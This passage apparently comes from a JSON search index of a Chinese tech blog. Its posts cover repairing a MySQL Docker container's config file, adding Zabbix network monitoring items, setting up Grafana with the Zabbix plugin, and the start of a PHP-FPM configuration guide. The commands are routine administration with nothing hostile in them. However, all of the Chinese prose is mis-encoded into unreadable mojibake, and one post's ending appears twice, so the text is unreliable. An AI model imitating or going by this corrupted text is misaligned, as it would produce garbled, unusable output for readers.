&lt;éœ€è¦å¤åˆ¶åˆ°ä¸»æœºçš„è·¯å¾„&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf ä¿®æ”¹ä¸»æœºä¸­çš„é…ç½®æ–‡ä»¶ å°†è¯¥é…ç½®æ–‡ä»¶mv åˆ°å®¹å™¨ä¸­ï¼š 123# è¯­æ³•ï¼šdocker cp &lt;é…ç½®æ–‡ä»¶åœ¨ä¸»æœºä¸­çš„è·¯å¾„&gt; &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf é‡å¯é…ç½®æ–‡ä»¶å³å¯ã€‚ æ€»ç»“ï¼šä¸¤ç§æ–¹å¼å‡å¯ä»¥æœ‰æ•ˆè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå½“ç„¶è¿™ç±»æ–¹å¼ä»…é€‚ç”¨äºå®¹å™¨æ˜¯å› é”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µã€‚ å‚è€ƒé“¾æ¥ Dockerä¿®æ”¹æ— æ³•å¯åŠ¨çš„å®¹å™¨çš„é…ç½®æ–‡ä»¶","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”æ·»åŠ ç›‘æ§é¡¹","slug":"zabbix-quick-start-add-monitoring-items","date":"2020-09-09T13:50:15.000Z","updated":"2020-09-09T13:51:50.880Z","comments":true,"path":"zabbix-quick-start-add-monitoring-items/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/","excerpt":"åœ¨Zabbix é»˜è®¤çš„ç›‘æ§é¡¹ä¸­ï¼Œå”¯ç‹¬æ²¡æœ‰ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ï¼Œè€Œç½‘ç»œçŠ¶å†µçš„ç›‘æ§åˆæ˜¯æˆ‘æœ€å…³å¿ƒçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨æ·»åŠ ã€‚ ä¸‹é¢ä»‹ç»çš„æ–¹å¼ä»…é€‚åˆä¸»æœºæ•°é‡ä¸å¤šçš„æƒ…å†µæ‰‹åŠ¨æ·»åŠ ï¼Œå¦‚æœä¸»æœºæ•°é‡å¾ˆå¤šï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¼šå¾ˆç¹çä½æ•ˆã€‚","text":"åœ¨Zabbix é»˜è®¤çš„ç›‘æ§é¡¹ä¸­ï¼Œå”¯ç‹¬æ²¡æœ‰ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ï¼Œè€Œç½‘ç»œçŠ¶å†µçš„ç›‘æ§åˆæ˜¯æˆ‘æœ€å…³å¿ƒçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨æ·»åŠ ã€‚ ä¸‹é¢ä»‹ç»çš„æ–¹å¼ä»…é€‚åˆä¸»æœºæ•°é‡ä¸å¤šçš„æƒ…å†µæ‰‹åŠ¨æ·»åŠ ï¼Œå¦‚æœä¸»æœºæ•°é‡å¾ˆå¤šï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¼šå¾ˆç¹çä½æ•ˆã€‚ è‡³äºæ›´å¥½çš„æ–¹å¼æ˜¯æ€æ ·çš„ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰å‘ç°ã€‚ æ·»åŠ ç›‘æ§é¡¹æ‰“å¼€Configuration-&gt;Hosts ä¸»æœºé¡µé¢ï¼Œç‚¹å‡»éœ€è¦ç›‘æ§é¡¹çš„ä¸»æœºçš„ Applicationã€‚ åœ¨Applicationåˆ—è¡¨ä¸­ï¼Œå¦‚æœæ²¡æœ‰çœ‹åˆ° Network interfacesè¿™ä¸€é¡¹ï¼Œé‚£ä¹ˆå¯ä»¥ç‚¹å‡»å³ä¸Šè§’çš„Create Applictionè‡ªå·±åˆ›å»ºã€‚ åˆ›å»ºå®Œæˆä¹‹åï¼Œitems é»˜è®¤æ˜¯æ²¡æœ‰çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ·»åŠ ï¼Œç»§ç»­ç‚¹å‡»items-&gt;create itemsã€‚ æ¥ä¸‹æ¥æ˜¯æœ€é‡è¦çš„ä¸€æ­¥ï¼Œæ·»åŠ ç›‘æ§é¡¹çš„å…·ä½“ä¿¡æ¯ã€‚ éœ€è¦æ³¨æ„çš„åœ°æ–¹æœ‰ä¸‹é¢å‡ ä¸ªï¼š Nameï¼šè‡ªå®šä¹‰è¯¥é¡¹ç›‘æ§çš„åç§° Keyï¼šnet.if.in[eth0,bytes]ï¼Œå…¶ä¸­eth0å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè¿™ä¸ªå…·ä½“çš„å€¼æ˜¯è¢«ç›‘æ§å¾—ä¸»æœºå¾—å®é™…ç½‘å¡ã€‚ Unitsï¼šbps Update intervalï¼šè‡ªåŠ¨æ›´æ–°æ—¶é—´ï¼Œè¿™ä¸ªå¯ä»¥è‡ªå®šä¹‰ã€‚ Applicationsï¼šé€‰æ‹© Network interfaces å¦‚ä½•ç¡®å®šç½‘å¡åœ°å€ï¼Ÿ è¿›å…¥æœåŠ¡å™¨ï¼Œè¾“å…¥ifconfigå‘½ä»¤æŸ¥çœ‹ï¼Œé€šå¸¸æ’åœ¨æœ€å‰é¢å¾—å°±æ˜¯å®é™…ç½‘å¡ã€‚ å®Œæˆä¹‹åï¼Œç‚¹å‡»Addæ·»åŠ ç›‘æ§é¡¹ã€‚ å¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œå¯ä»¥åœ¨åˆšæ‰æ·»åŠ çš„ç›‘æ§é¡¹åˆ—è¡¨ä¸­çœ‹åˆ°ç›‘æ§é¡¹çŠ¶æ€æ˜¯å¯ç”¨çš„ã€‚ è¿™ä¸ªæ—¶å€™å·²ç»å¯ä»¥çœ‹åˆ°è¯¥ç›‘æ§é¡¹ç›¸å…³çš„æ•°æ®äº†ï¼Œå¦‚æœå¸Œæœ›åœ¨Grafana ä¸­å±•ç¤ºï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨é€‰æ‹©Applicationæ—¶ï¼Œé€‰æ‹©Network interfaceså°±å¥½äº†ã€‚ ç»“åˆGrafanaï¼Œæœ€åçš„æ•ˆæœå¤§æ¦‚æ˜¯è¿™æ ·ï¼š è¿™é‡Œåªæ˜¯ä¸¾äº†ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ¥äº†è§£Zabbix å¦‚ä½•æ‰‹åŠ¨æ·»åŠ ç›‘æ§é¡¹ï¼Œå…¶ä»–ç±»å‹çš„æ•°æ®ä¹Ÿæ˜¯é€šè¿‡ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œæ·»åŠ ã€‚ å‚è€ƒé“¾æ¥ zabbixç›‘æ§ç½‘ç»œçš„å‡ºå…¥å£æµé‡ Cannot find information for this network interface in /proc/net/dev","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°","slug":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform","date":"2020-09-08T13:08:25.000Z","updated":"2020-09-08T13:09:34.991Z","comments":true,"path":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","link":"","permalink":"https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","excerpt":"åœ¨å‰é¢äº†è§£äº†å¦‚ä½•éƒ¨ç½² Zabbixï¼Œä¼—æ‰€å‘¨çŸ¥Zabbix çš„éƒ¨ç½²å¹¶ä¸æ˜¯éš¾çš„éƒ¨åˆ†ï¼Œé…ç½®æ‰æ˜¯æœ€éš¾çš„é‚£éƒ¨åˆ†ã€‚ æ‰€ä»¥å¦‚ä½•è·å–åˆ°æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œå°†é‚£éƒ¨åˆ†æ•°æ®ä»¥æ›´ç›´è§‚çš„æ–¹å¼å±•ç°å‡ºæ¥ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬æ›´å…³å¿ƒçš„ã€‚ Zabbix é»˜è®¤æœ‰è‡ªå·±çš„ Graphsï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚","text":"åœ¨å‰é¢äº†è§£äº†å¦‚ä½•éƒ¨ç½² Zabbixï¼Œä¼—æ‰€å‘¨çŸ¥Zabbix çš„éƒ¨ç½²å¹¶ä¸æ˜¯éš¾çš„éƒ¨åˆ†ï¼Œé…ç½®æ‰æ˜¯æœ€éš¾çš„é‚£éƒ¨åˆ†ã€‚ æ‰€ä»¥å¦‚ä½•è·å–åˆ°æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œå°†é‚£éƒ¨åˆ†æ•°æ®ä»¥æ›´ç›´è§‚çš„æ–¹å¼å±•ç°å‡ºæ¥ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬æ›´å…³å¿ƒçš„ã€‚ Zabbix é»˜è®¤æœ‰è‡ªå·±çš„ Graphsï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚ Grafana æ˜¯ä»€ä¹ˆï¼Ÿ Grafanaæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„å¼€æºåº¦é‡åˆ†æå’Œå¯æ˜¯åŒ–çš„å·¥å…·ï¼Œå¯ä»¥é€šè¿‡è¯¥å°†é‡‡é›†çš„æ•°æ®æŸ¥è¯¢ç„¶åå¯è§†åŒ–çš„å±•ç¤ºï¼Œå¹¶åŠæ—¶é€šçŸ¥ã€‚ Grafana æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å±•ç¤ºæ–¹å¼ï¼šå¿«é€Ÿçµæ´»çš„å®¢æˆ·ç«¯å›¾è¡¨ï¼Œé¢æ¿æ’ä»¶æœ‰è®¸å¤šä¸åŒæ–¹å¼çš„å¯è§†åŒ–æŒ‡æ ‡å’Œæ—¥å¿—ï¼Œå®˜æ–¹åº“ä¸­å…·æœ‰ä¸°å¯Œçš„ä»ªè¡¨ç›˜æ’ä»¶ï¼Œæ¯”å¦‚çƒ­å›¾ã€æŠ˜çº¿å›¾ã€å›¾è¡¨ç­‰å¤šç§å±•ç¤ºæ–¹å¼. æ•°æ®æºï¼šGraphiteã€InfluxDBã€OpenTSDBã€Prometheusã€Elasticsearchã€CloudWatchå’ŒKairosDbã€Zabbixç­‰ã€‚ é€šçŸ¥æé†’ï¼šä»¥å¯è§†æ–¹å¼å®šä¹‰æœ€é‡è¦æŒ‡æ ‡çš„æŠ¥è­¦è§„åˆ™ï¼ŒGrafanaå°†ä¸æ–­è®¡ç®—å¹¶å‘é€é€šçŸ¥ï¼Œåœ¨æ•°æ®è¾¾åˆ°é¢„è®¾é˜ˆå€¼æ—¶é€šè¿‡slackï¼ŒPagerDutyç­‰å¤„ç†é€šçŸ¥ã€‚ æ··åˆå±•ç¤ºï¼šåœ¨åŒä¸€å›¾è¡¨ä¸­æ··åˆä½¿ç”¨ä¸åŒçš„æ•°æ®æºï¼Œå¯ä»¥åŸºäºæ¯ä¸ªæŸ¥è¯¢æŒ‡å®šæ•°æ®æºï¼Œç”šè‡³è‡ªå®šä¹‰æ•°æ®æºã€‚ æ³¨é‡Šï¼šä½¿ç”¨æ¥è‡ªä¸åŒæ•°æ®æºçš„ä¸°å¯Œäº‹ä»¶æ¥å±•ç¤ºå›¾è¡¨ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨äº‹ä»¶ä¸Šä¼šæ˜¾ç¤ºå®Œæ•´çš„äº‹ä»¶å…ƒæ•°æ®å’Œæ ‡è®°ã€‚ è¿‡æ»¤å™¨ï¼šAd-hocè¿‡æ»¤å™¨å…è®¸åŠ¨æ€åˆ›å»ºæ–°çš„é”®/å€¼è¿‡æ»¤å™¨ï¼Œè¿™äº›è¿‡æ»¤å™¨ä¼šè‡ªåŠ¨åº”ç”¨äºä½¿ç”¨è¯¥æ•°æ®æºçš„æ‰€æœ‰æŸ¥è¯¢ã€‚ å®‰è£…Grafana çš„å®‰è£…è¿˜æ˜¯å»ºè®®æ ¹æ®è‡ªå·±å®é™…çš„ç³»ç»Ÿç¯å¢ƒå»å®˜ç½‘é€‰æ‹©é€‚åˆè‡ªå·±çš„ä¸‹è½½é“¾æ¥ã€‚ æ¯”å¦‚æˆ‘çš„ç¯å¢ƒæ˜¯ Ubuntu 18.04ï¼Œæˆ‘æƒ³å®‰è£… Grafana 7.0ï¼Œæ‰€ä»¥æˆ‘çš„å®‰è£…æ–¹å¼åº”è¯¥æ˜¯ï¼š 123$ sudo apt-get install -y adduser libfontconfig1$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb$ sudo dpkg -i grafana_7.0.0_amd64.deb å¯åŠ¨æœåŠ¡ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ grafana-serverï¼š 12$ sudo systemctl daemon-reload$ sudo systemctl start grafana-server è®¾ç½®å¼€æœºå¯åŠ¨ï¼š 1$ sudo systemctl enable grafana-server.service æŸ¥çœ‹ grafana-serveræ‰€ç›‘å¬çš„ç«¯å£ï¼š 12$ sudo netstat -lntptcp6 0 0 :::3000 :::* LISTEN 17194&#x2F;grafana-serve 3000 æ˜¯Grafana é»˜è®¤ç›‘å¬ç«¯å£ï¼Œç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—® http://your_ip_address:3000 å³å¯ã€‚ æ­£å¸¸åº”è¯¥å¯ä»¥çœ‹åˆ°è¯¥é¡µé¢ï¼Œå¦‚æœä½ èƒ½çœ‹åˆ°3000 ç«¯å£è¢«ç›‘å¬ï¼Œä½†æ˜¯é¡µé¢ä¸€ç›´æ‰“ä¸å¼€ï¼Œé‚£å¯èƒ½æ˜¯å› ä¸ºé˜²ç«å¢™æ²¡æœ‰å…è®¸3000 ç«¯å£ã€‚ é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯ï¼šadminï¼Œç™»å½•ä¹‹åè®°å¾—ç¬¬ä¸€æ—¶é—´ä¿®æ”¹é»˜è®¤å¯†ç ã€‚ å®‰è£…Zabbix æ’ä»¶æ‰“å¼€Grafana çš„æ’ä»¶åˆ—è¡¨ï¼Œæ‰¾åˆ°Zabbixã€‚ è¿™é‡Œæ ¹æ®å®å®é™…æƒ…å†µï¼Œé€‰æ‹©å¯¹åº”çš„ç‰ˆæœ¬ã€‚ é€šè¿‡grafana-cli å®‰è£…zabbix æ’ä»¶ï¼Œå°†ä¸‹é¢è¿™è¡Œä»£ç æ”¾åœ¨å®‰è£…äº† Grafana çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š 12$ grafana-cli plugins install alexanderzobnin-zabbix-appâœ” Installed alexanderzobnin-zabbix-app successfully å®‰è£…å®Œæˆä¹‹åï¼Œé‡å¯Grafanaï¼š 1$ sudo systemctl restart grafana-server ç„¶åæ‰“å¼€Grafana çš„Web ç•Œé¢ï¼Œåœ¨æ’ä»¶åˆ—è¡¨ä¸­æ‰¾åˆ° Zabbixã€‚ ç‚¹å‡»å¯ç”¨ã€‚ add data sourceè‡ªä» Grafana 7.0 ä»¥åï¼Œæ²¡æœ‰ç­¾åçš„æ’ä»¶é»˜è®¤åœ¨ datasource ä¸­æ˜¯ä¸å¯è§çš„â€¦ å‘å•Šï¼Œæœ€åˆæˆ‘å®‰è£…çš„æ˜¯ Zabbix5.0ï¼Œç„¶åçœ‹è§Grafana 7.0 å¥½åƒåªé€‚é…4.0ï¼Œå¿ƒæƒ³å®Œäº†ï¼Œè¯¥ä¸ä¼šå‡ºç°ä»€ä¹ˆç‰ˆæœ¬ä¸å…¼å®¹çš„é—®é¢˜å§ï¼Ÿ ç»“æœåœ¨add data sourceè¿™ä¸€æ­¥ï¼Œä¸€ç›´æ‰¾ä¸åˆ° zabbixâ€¦ ç„¶åä»Šå¤©æŠŠ5.0 å®Œå…¨å¸è½½äº†ï¼Œé‡æ–°è£…å›äº†4.0ï¼Œç»“æœåˆ°äº†add data sourceè¿™ä¸€æ­¥æ‰å‘ç°ï¼Œè¿˜æ˜¯æ‰¾ä¸åˆ°zabbixï¼Œå½“æ—¶å¿ƒæ€å°±å´©äº†â€¦ ç›´åˆ°æˆ‘çœ‹è§è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¹ˆé‡è¦çš„ä¿¡æ¯ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­å±…ç„¶æ²¡è®°å½•ã€‚ å¦‚æœä½ æ— æ³•è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ï¼š 1234# vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini# æ·»åŠ ä¸€è¡Œallow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource ç„¶åé‡å¯Grafanaï¼š 1$ sudo systemctl restart grafana-server å†æ¬¡æ‰“å¼€Web é¡µé¢ï¼Œç°åœ¨å°±èƒ½æ‰¾åˆ° Zabbix äº†ã€‚ é…ç½® data sourceåªç”¨ä¿®æ”¹ä»¥ä¸‹å››ä¸ªåœ°æ–¹å°±å¥½äº†ï¼Œç„¶åç‚¹å‡»ä¿å­˜ã€‚ add dashboardä¾æ¬¡ç‚¹å‡»add dashboard-&gt; add new panelï¼Œç„¶åæŒ‰ç…§ä»¥ä¸‹æ–¹å¼é…ç½®ï¼Œå°±å¯ä»¥é€‰æ‹©å±•ç¤ºè‡ªå·±æƒ³è¦çš„æ•°æ®äº†ã€‚ æœ€åçš„æ•ˆæœï¼š è¿™é‡Œåªæ˜¯ä»‹ç»äº† Zabbix + Grafana æœ€åŸºç¡€çš„ç”¨æ³•ï¼Œèƒ½çœ‹åˆ°çš„æ•°æ®ä¹Ÿæ˜¯æœ€ç®€å•çš„ä¸€äº›ï¼Œå¦‚æœæƒ³çœ‹åˆ°æ›´å¤šçš„æ•°æ®ï¼Œé‚£å°±å¾—æ›´åŠ äº†è§£ Zabbix äº†ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"å½“ Docker å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶å¦‚ä½•ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Ÿ","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally","date":"2020-09-07T00:13:24.000Z","updated":"2020-09-07T00:14:53.536Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","excerpt":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ","text":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸¤ç§æ–¹å¼å»ä¿®æ”¹ï¼š2. Docker å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨ /var/lib/docker/overlay/ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°è¯¥ç›®å½•ä¸‹å¯¹åº”çš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚2. æŠŠå®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°ä¸»æœºä¸­ï¼Œä¿®æ”¹å®Œä¹‹åï¼Œå†ç§»åŠ¨åˆ°å®¹å™¨ä¸­ã€‚ æ–¹å¼ä¸€ æŸ¥è¯¢æ—¥å¿— 123456docker logs &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting ç”±äºå¼‚å¸¸æ—¥å¿—å¯ä»¥å¾—çŸ¥æ˜¯å› ä¸ºæˆ‘å°†relay-log å†™æˆäº† realy å¯¼è‡´å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚ æŸ¥æ‰¾æ–‡ä»¶ 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf è¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæ¯ä¸€æ¬¡é‡å¯Mysql å®¹å™¨éƒ½ä¼šä¿ç•™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ç†è®ºä¸Šï¼Œç›´æ¥ä¿®æ”¹ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå°±æ˜¯å½“å‰Mysql æ‰€ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ é‡å¯å®¹å™¨å³å¯ã€‚ æ–¹å¼äºŒå¦‚æœç¬¬ä¸€ç§æ–¹å¼æ²¡ç”Ÿæ•ˆï¼Œé‚£å¯ä»¥å°è¯•ç¬¬äºŒç§æ–¹å¼ã€‚ å¤åˆ¶å®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶åˆ°ä¸»æœºï¼š 123# è¯­æ³•ï¼šdocker cp &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt; &lt;éœ€è¦å¤åˆ¶åˆ°ä¸»æœºçš„è·¯å¾„&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf ä¿®æ”¹ä¸»æœºä¸­çš„é…ç½®æ–‡ä»¶ å°†è¯¥é…ç½®æ–‡ä»¶mv åˆ°å®¹å™¨ä¸­ï¼š 123# è¯­æ³•ï¼šdocker cp &lt;é…ç½®æ–‡ä»¶åœ¨ä¸»æœºä¸­çš„è·¯å¾„&gt; &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf é‡å¯é…ç½®æ–‡ä»¶å³å¯ã€‚ æ€»ç»“ï¼šä¸¤ç§æ–¹å¼å‡å¯ä»¥æœ‰æ•ˆè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå½“ç„¶è¿™ç±»æ–¹å¼ä»…é€‚ç”¨äºå®¹å™¨æ˜¯å› é”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µã€‚ å‚è€ƒé“¾æ¥ Dockerä¿®æ”¹æ— æ³•å¯åŠ¨çš„å®¹å™¨çš„é…ç½®æ–‡ä»¶","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP-FPM é…ç½®åˆå§‹åŒ–","slug":"php-fpm-configuration-initialization","date":"2020-09-06T03:57:11.000Z","updated":"2020-09-06T04:05:33.658Z","comments":true,"path":"php-fpm-configuration-initialization/","link":"","permalink":"https://www.0x2beace.com/php-fpm-configuration-initialization/","excerpt":"php-fpmï¼ˆFastCGI Process Mangerï¼‰æ˜¯ä¸€ä¸ªPHP FastCGI ç®¡ç†å™¨ï¼Œä¸“é—¨å’ŒNginx çš„ ngx_fastcgi_modulæ¨¡å—å¯¹æ¥ï¼Œç”¨æ¥å¤„ç†åŠ¨æ€è¯·æ±‚ã€‚","text":"php-fpmï¼ˆFastCGI Process Mangerï¼‰æ˜¯ä¸€ä¸ªPHP FastCGI ç®¡ç†å™¨ï¼Œä¸“é—¨å’ŒNginx çš„ ngx_fastcgi_modulæ¨¡å—å¯¹æ¥ï¼Œç”¨æ¥å¤„ç†åŠ¨æ€è¯·æ±‚ã€‚ åˆå§‹åŒ–å½“å®‰è£…äº†PHP ä¹‹åï¼Œå¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹å‘æ¥å¯¹é»˜è®¤é…ç½®è¿›è¡Œä¿®æ”¹ï¼Œä»¥è¾¾åˆ°ä¼˜åŒ–çš„æ•ˆæœã€‚ 1. æ ¸å¿ƒé…ç½®æ–‡ä»¶æ ¸å¿ƒé…ç½®æ–‡ä»¶å…¶å®å°±æ˜¯ php.iniï¼Œè¯¥é…ç½®æ–‡ä»¶çš„ä½œç”¨é€šå¸¸æ˜¯ç”¨æ¥å¯ç”¨æˆ–ç¦ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ï¼ŒåŠä¿®æ”¹PHP æ—¶åŒºç­‰ã€‚ 123# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inidate.timezone &#x3D; Asia&#x2F;Shanghai 2. å…¨å±€é…ç½®æ–‡ä»¶å…¨å±€é…ç½®æ–‡ä»¶php-fpm.confï¼Œé€šå¸¸ç”¨æ¥é…ç½®ä¸€äº›è¾…åŠ©æ€§åŠŸèƒ½ã€‚ 123456# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conferror_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.loglog_level &#x3D; notice;process_max &#x3D; 0deamonize &#x3D; yes å‚æ•°è§£æï¼š error_logï¼šé”™è¯¯æ—¥å¿—è·¯å¾„ log_levelï¼šæ—¥å¿—çº§åˆ«ï¼Œé»˜è®¤ä¸ºnotice 